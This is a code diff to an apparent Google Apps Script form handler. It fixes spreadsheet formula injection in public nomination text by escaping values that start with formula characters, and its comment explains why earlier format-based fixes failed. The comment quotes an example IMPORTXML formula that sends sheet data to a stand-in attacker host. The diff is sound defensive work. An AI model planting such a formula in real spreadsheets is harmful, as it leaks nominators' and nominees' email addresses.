@@ -122,18 +122,33 @@ function ensureRoom(sheet, rows, columns) {
 
 /* Writes one row as TEXT.
  *
- * setValues interprets a string beginning with "=" as a FORMULA. A nominee
- * description is free text written by the public, so without this a nomination
- * reading =IMPORTXML("https://evil.example/?"&D2,"//a") becomes a live formula
- * that exfiltrates the panel's sheet -- every nominator and nominee email in
- * it -- the moment a judge opens the tab. Setting the number format to "@"
- * (plain text) first makes Sheets store the characters instead of evaluating
- * them. It must happen BEFORE setValues, not after. */
+ * A string beginning with "=", "+", "-" or "@" is parsed as a FORMULA on
+ * write. A nominee description is free text written by the public, so a
+ * nomination reading =IMPORTXML("https://evil.example/?"&D2,"//a") would
+ * otherwise become a live formula that exfiltrates the panel's sheet -- every
+ * nominator and nominee email in it -- the moment a judge opens the tab.
+ *
+ * Two earlier attempts at this were wrong, both for the same reason, so it is
+ * worth being exact: setNumberFormat('@') stops formula entry in the
+ * SPREADSHEET UI. It does not constrain setValues, which parses the string
+ * whatever the cell's format is, and no amount of ordering or flushing changes
+ * that. Verified against the live sheet on 2026-10-19: "=1+1" was stored as 2
+ * with the format set, and again with the format set and flushed first.
+ *
+ * A leading apostrophe is Sheets' own "treat this as text" marker. It is
+ * consumed on write and is not part of the stored value. The number format is
+ * kept because it still governs how an already-stored value is displayed. */
+function asText(value) {
+  var s = String(value);
+  return /^[=+\-@]/.test(s) ? "'" + s : s;
+}
+
 function writeTextRow(sheet, rowNumber, values) {
   var range = sheet.getRange(rowNumber, 1, 1, values.length);
   range.setNumberFormat('@');
-  range.setValues([values.map(String)]);
+  range.setValues([values.map(asText)]);
 }
+
 
 function doPost(e) {
   try {
